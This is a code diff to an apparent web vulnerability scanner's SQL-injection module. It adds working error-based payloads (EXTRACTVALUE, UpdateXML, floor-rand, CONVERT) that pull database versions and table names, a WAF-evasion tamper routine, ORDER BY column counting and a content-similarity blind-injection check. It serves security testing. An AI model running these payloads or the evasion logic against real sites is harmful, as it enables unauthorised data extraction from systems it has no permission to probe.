@@ -38,24 +38,44 @@ _ERROR_SIGS: List[Tuple[str, str]] = [
     (r"mysql_fetch", "MySQL"),
     (r"supplied argument is not a valid mysql", "MySQL"),
     (r"column count doesn't match value count", "MySQL"),
+    # EXTRACTVALUE/UpdateXML error output (contains the extracted value)
+    (r"xpath syntax error", "MySQL"),
+    (r"extractvalue\(1,", "MySQL"),
+    # floor(rand()) GROUP BY error — leaks real data
+    (r"duplicate entry '~", "MySQL"),
+    (r"duplicate entry.*for key 'group_key'", "MySQL"),
+    # MySQL connection/auth errors surfaced through PHP
+    (r"access denied for user", "MySQL"),
+    (r"mysql server has gone away", "MySQL"),
+    (r"lost connection to mysql", "MySQL"),
+    (r"can't connect to mysql", "MySQL"),
+    # Generic PHP/MySQL integration errors
+    (r"mysqli_fetch", "MySQL"),
+    (r"num_rows", "MySQL"),
+    (r"sql syntax.*mysql", "MySQL"),
+    (r"warning.*mysql_", "MySQL"),
     (r"unclosed quotation mark", "MSSQL"),
     (r"incorrect syntax near", "MSSQL"),
     (r"microsoft sql server", "MSSQL"),
     (r"\[microsoft\]\[odbc", "MSSQL"),
     (r"mssql_query\(\)", "MSSQL"),
+    (r"conversion failed when converting", "MSSQL"),
     (r"ora-\d{4,5}", "Oracle"),
     (r"oracle error", "Oracle"),
     (r"oracle.*driver", "Oracle"),
+    (r"quoted string not properly terminated", "Oracle"),
     (r"sqlite3::", "SQLite"),
     (r"sqlite\.exception", "SQLite"),
     (r"syntax error.*sqlite", "SQLite"),
+    (r"no such table:", "SQLite"),
     (r"pg_query\(\)", "PostgreSQL"),
     (r"postgresql.*error", "PostgreSQL"),
     (r"valid postgresql result", "PostgreSQL"),
     (r"psql.*error", "PostgreSQL"),
+    (r"pgsql.*error", "PostgreSQL"),
     (r"division by zero", "Generic"),
-    (r"sql syntax.*mysql", "MySQL"),
-    (r"warning.*mysql_", "MySQL"),
+    (r"sql command not properly ended", "Oracle"),
+    (r"unrecognized token", "SQLite"),
 ]
 
 # ---------------------------------------------------------------------------
@@ -76,6 +96,28 @@ _APPEND_ERROR_SUFFIXES: List[str] = [
     "')) --",
 ]
 
+# EXTRACTVALUE / UpdateXML / floor-rand: MySQL-specific error-based payloads that
+# extract real data (version, dbname) into an XPATH error message.
+# Much harder for WAFs to filter than basic quotes or UNION SELECT.
+# Format: appended to a numeric original (e.g. id=1 → id=1 AND EXTRACTVALUE...)
+_APPEND_MYSQL_ERROR_PAYLOADS: List[str] = [
+    # EXTRACTVALUE — XPath error with embedded SQL result
+    " AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
+    " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -",
+    " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name)"
+    " FROM information_schema.tables WHERE table_schema=database())))-- -",
+    # UpdateXML — same family, different function
+    " AND UpdateXML(1,CONCAT(0x7e,version()),1)-- -",
+    " AND UpdateXML(1,CONCAT(0x7e,(SELECT database())),1)-- -",
+    # floor(rand()) GROUP BY — triggers "Duplicate entry '~<value>'" error
+    " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,"
+    "floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+    # MSSQL CONVERT error (leaks version string)
+    " AND 1=CONVERT(int,(SELECT @@version))--",
+    # Generic GROUP BY HAVING
+    " GROUP BY columnnames HAVING 1=1--",
+]
+
 # Replace-mode payloads — replace the value entirely.
 # Better suited for string parameters or when we don't know the original value.
 _REPLACE_ERROR_PAYLOADS: List[str] = [
@@ -91,6 +133,9 @@ _REPLACE_ERROR_PAYLOADS: List[str] = [
     "' GROUP BY columnnames HAVING 1=1--",
     "1 AND 1=CONVERT(int,(SELECT @@version))--",
     "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
+    # EXTRACTVALUE replace-mode (string context: close quote first)
+    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
+    "1' AND UpdateXML(1,CONCAT(0x7e,version()),1)-- -",
 ]
 
 # ---------------------------------------------------------------------------
@@ -215,6 +260,34 @@ class SQLiScanner(BaseModule):
             return self.http.get(rebuild_url_with_params(url, params))
         return self.http.post(url, data=params)
 
+    @staticmethod
+    def _sql_tamper(payload: str) -> List[str]:
+        """Generate WAF-evading SQL payload variants via comment insertion.
+
+        Used when the config includes ``tamper`` or when a WAF is detected.
+        Keeps the original first so the fast path stays unmodified.
+        Comment insertion (AND/**/1=1) is the most broadly effective SQL tamper:
+        it breaks keyword-based regex filters without changing DB semantics.
+        """
+        variants: List[str] = [payload]
+        # Replace spaces with MySQL comment tokens
+        space_variant = re.sub(r' ', '/**/', payload)
+        if space_variant not in variants:
+            variants.append(space_variant)
+        # Mixed-case keywords (SELECT → SeLeCt)
+        def _mixcase(m):
+            s = m.group(0)
+            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
+        kw_re = re.compile(r'\b(SELECT|UNION|AND|OR|FROM|WHERE|ORDER|SLEEP|EXTRACTVALUE|UpdateXML)\b', re.I)
+        mixed = kw_re.sub(_mixcase, payload)
+        if mixed not in variants:
+            variants.append(mixed)
+        # Hex-encode quotes: ' → 0x27
+        hex_q = payload.replace("'", "0x27")
+        if hex_q not in variants and hex_q != payload:
+            variants.append(hex_q)
+        return variants
+
     # ------------------------------------------------------------------
     # Strategy 1: Error-based
     # ------------------------------------------------------------------
@@ -235,28 +308,47 @@ class SQLiScanner(BaseModule):
         page that mentions "mysql" in a tutorial) do not trigger a false positive.
         """
         baseline_lower = baseline_text.lower()
+        use_tamper = bool(self.config.get("tamper") or self.config.get("_detected_waf"))
 
         # Append-mode: e.g. id=1 → id=1'
         for suffix in _APPEND_ERROR_SUFFIXES:
-            injected_params = self._append(params, param_name, suffix)
-            finding = self._check_error_response(
-                url, method, injected_params, param_name,
-                display_payload=f"{params.get(param_name, '')}{suffix}",
-                baseline_lower=baseline_lower,
-            )
-            if finding:
-                return finding
+            suffixes_to_try = self._sql_tamper(suffix) if use_tamper else [suffix]
+            for s in suffixes_to_try:
+                injected_params = self._append(params, param_name, s)
+                finding = self._check_error_response(
+                    url, method, injected_params, param_name,
+                    display_payload=f"{params.get(param_name, '')}{s}",
+                    baseline_lower=baseline_lower,
+                )
+                if finding:
+                    return finding
+
+        # MySQL-specific deep error extraction (EXTRACTVALUE / UpdateXML / floor-rand).
+        # Run AFTER the simple-quote pass so we don't waste heavy payloads on non-MySQL.
+        for suffix in _APPEND_MYSQL_ERROR_PAYLOADS:
+            suffixes_to_try = self._sql_tamper(suffix) if use_tamper else [suffix]
+            for s in suffixes_to_try:
+                injected_params = self._append(params, param_name, s)
+                finding = self._check_error_response(
+                    url, method, injected_params, param_name,
+                    display_payload=f"{params.get(param_name, '')}{s}",
+                    baseline_lower=baseline_lower,
+                )
+                if finding:
+                    return finding
 
         # Replace-mode: e.g. id=' OR '1'='1
         for payload in self.load_payloads(_REPLACE_ERROR_PAYLOADS, self.custom_payloads):
-            injected_params = self._replace(params, param_name, payload)
-            finding = self._check_error_response(
-                url, method, injected_params, param_name,
-                display_payload=payload,
-                baseline_lower=baseline_lower,
-            )
-            if finding:
-                return finding
+            payloads_to_try = self._sql_tamper(payload) if use_tamper else [payload]
+            for p in payloads_to_try:
+                injected_params = self._replace(params, param_name, p)
+                finding = self._check_error_response(
+                    url, method, injected_params, param_name,
+                    display_payload=p,
+                    baseline_lower=baseline_lower,
+                )
+                if finding:
+                    return finding
 
         return None
 
@@ -419,6 +511,78 @@ class SQLiScanner(BaseModule):
     # Strategy 1b: UNION-based (in-band extraction — solid, visible proof)
     # ------------------------------------------------------------------
 
+    def _find_column_count_orderby(
+        self,
+        url: str,
+        method: str,
+        params: Dict[str, str],
+        param_name: str,
+        orig: str,
+        max_cols: int = 20,
+    ) -> Optional[int]:
+        """Binary search via ORDER BY to find the query's column count.
+
+        ORDER BY N succeeds while N ≤ actual column count, and either produces
+        an error or changes the response when N exceeds the count.  Binary search
+        over [1, max_cols] finds the exact value in ⌈log₂(max_cols)⌉ ≈ 5 requests
+        instead of trying every UNION(null,…) permutation (up to max_cols×dialects).
+
+        Returns the column count, or None when ORDER BY is not injectable
+        (e.g. the parameter is not in a SELECT, or the technique is blocked).
+        """
+        # Baseline from ORDER BY 1 — if this fails the param isn't in a SELECT.
+        ref_payload = f"{orig} ORDER BY 1-- -"
+        r_ref = self._send(url, method, self._replace(params, param_name, ref_payload))
+        if r_ref is None or r_ref.status_code >= 500:
+            # Also try append-mode for numeric params
+            ref_payload_a = f" ORDER BY 1-- -"
+            r_ref = self._send(url, method, self._append(params, param_name, ref_payload_a))
+            if r_ref is None or r_ref.status_code >= 500:
+                return None
+            append_mode = True
+        else:
+            append_mode = False
+
+        ref_len = len(r_ref.text)
+        ref_status = r_ref.status_code
+
+        def _probe(n: int) -> bool:
+            """True = ORDER BY n succeeds (same-ish response as ORDER BY 1)."""
+            suffix = f" ORDER BY {n}-- -"
+            if append_mode:
+                p = self._append(params, param_name, suffix)
+            else:
+                p = self._replace(params, param_name, f"{orig} ORDER BY {n}-- -")
+            r = self._send(url, method, p)
+            if r is None or r.status_code >= 500:
+                return False
+            if r.status_code != ref_status:
+                return False
+            # Size should be within 5% of the ORDER BY 1 baseline
+            size_ok = abs(len(r.text) - ref_len) <= max(50, int(ref_len * 0.05))
+            return size_ok
+
+        # Binary search: find the largest n where _probe(n) is True
+        lo, hi = 1, max_cols
+        if not _probe(hi):
+            # At least some range exists; narrow from the top
+            pass
+        else:
+            # All cols up to max_cols are fine — can't determine count
+            return None
+
+        # Standard binary search for the boundary
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if _probe(mid):
+                lo = mid
+            else:
+                hi = mid - 1
+
+        result = lo
+        logger.debug("[SQLi/UNION/OrderBy] column count = %d (append=%s)", result, append_mode)
+        return result
+
     def _test_union_based(
         self,
         url: str,
@@ -467,6 +631,15 @@ class SQLiScanner(BaseModule):
                 return None
 
         orig = params.get(param_name, "")
+
+        # --- ORDER BY column detection (O(log n) vs O(n) brute force) ---
+        # `ORDER BY N` succeeds while N ≤ column count, fails (error/empty) beyond.
+        # Binary search over 1..max_cols gives us the exact count in ~5 requests
+        # instead of trying every UNION(null,...) permutation.
+        n_cols_known = self._find_column_count_orderby(
+            url, method, params, param_name, orig, max_cols=20,
+        )
+
         t1 = "".join(_r.choices(_s.ascii_lowercase, k=4))
         t2 = "".join(_r.choices(_s.ascii_lowercase, k=4))
         joined = t1 + t2  # appears ONLY if the DB concatenated → executed
@@ -507,10 +680,15 @@ class SQLiScanner(BaseModule):
         budget = 80
         sent = 0
 
-        # n in the OUTER loop with dialect/prefix/filler inner means the common
-        # case (correct column count, first dialect/prefix) is hit within a few
-        # requests, while both DB dialects still get a chance at every n.
-        for n in range(1, max_cols + 1):
+        # If ORDER BY revealed the exact count, probe only that n (plus ±1 for
+        # bracket variants). Otherwise fall back to full range 1..max_cols.
+        if n_cols_known is not None:
+            logger.debug("[SQLi/UNION] ORDER BY says %d cols — probing that directly", n_cols_known)
+            col_range = [n for n in [n_cols_known - 1, n_cols_known, n_cols_known + 1] if 1 <= n <= max_cols]
+        else:
+            col_range = range(1, max_cols + 1)
+
+        for n in col_range:
             for d_label, mk, extractors in dialects:
                 marker = mk(t1, t2)
                 col_variants = (
@@ -743,11 +921,27 @@ class SQLiScanner(BaseModule):
         return None
 
     @staticmethod
+    def _token_similarity(a: str, b: str) -> float:
+        """Jaccard similarity on word tokens — more stable than raw byte size.
+
+        Identical pages with dynamic timestamps/nonces that differ by a few bytes
+        still share >95% of their word tokens.  Pages where SQL omits a block of
+        rows share far fewer tokens, making this a strong additional signal beyond
+        pure byte length comparison.
+        """
+        import re as _re
+        ta = set(_re.findall(r"\w+", a))
+        tb = set(_re.findall(r"\w+", b))
+        if not ta and not tb:
+            return 1.0
+        return len(ta & tb) / len(ta | tb)
+
+    @staticmethod
     def _classify_bool_pair(
         r_true, r_false, baseline_len: int, tolerance: int, min_diff: int,
     ) -> Optional[str]:
-        """Return the signal kind ("AND"/"OR"/"status-code") for a true/false
-        response pair, or ``None`` when the pair shows no boolean-SQLi signal."""
+        """Return the signal kind ("AND"/"OR"/"status-code"/"content-hash") for
+        a true/false response pair, or ``None`` when no boolean-SQLi signal."""
         t_len = len(r_true.text)
         f_len = len(r_false.text)
         diff = abs(t_len - f_len)
@@ -761,6 +955,15 @@ class SQLiScanner(BaseModule):
             return "OR"
         if r_true.status_code != r_false.status_code:
             return "status-code"
+
+        # Content-similarity fallback: even if byte lengths are similar, the word-
+        # token distribution can reveal that different DB rows were returned.
+        # Only trigger when the pages differ significantly in content (< 85%
+        # similarity) — prevents false positives on pages that just have nonces.
+        sim = SQLiScanner._token_similarity(r_true.text or "", r_false.text or "")
+        if sim < 0.85:
+            return "content-diff"
+
         return None
 
     def _reconfirm_bool(
@@ -839,6 +1042,19 @@ class SQLiScanner(BaseModule):
                 f"does not, e.g.: {visible!r}."
                 if visible else ""
             )
+            if kind == "content-diff":
+                sim = self._token_similarity(r_true.text or "", r_false.text or "")
+                evidence_prefix = (
+                    f"Content-similarity between TRUE and FALSE responses is {sim:.0%} "
+                    f"(threshold: 85%) — pages share significantly different word tokens, "
+                    f"indicating the database evaluates our condition."
+                )
+            else:
+                evidence_prefix = (
+                    f"Same input, one logical tweak, two different pages: the always-true "
+                    f"condition returned {t_len} B and the always-false condition {f_len} B "
+                    f"(baseline {baseline_len} B, pattern={kind})."
+                )
             return Finding(
                 vuln_type="SQL Injection (Boolean-based Blind)",
                 url=url,
@@ -846,9 +1062,7 @@ class SQLiScanner(BaseModule):
                 parameter=param_name,
                 payload=f"TRUE: {true_pl!r}  /  FALSE: {false_pl!r}",
                 evidence=(
-                    f"Same input, one logical tweak, two different pages: the always-true "
-                    f"condition returned {t_len} B and the always-false condition {f_len} B "
-                    f"(baseline {baseline_len} B, pattern={kind})."
+                    evidence_prefix
                     + visible_note
                 ),
                 confidence="medium",
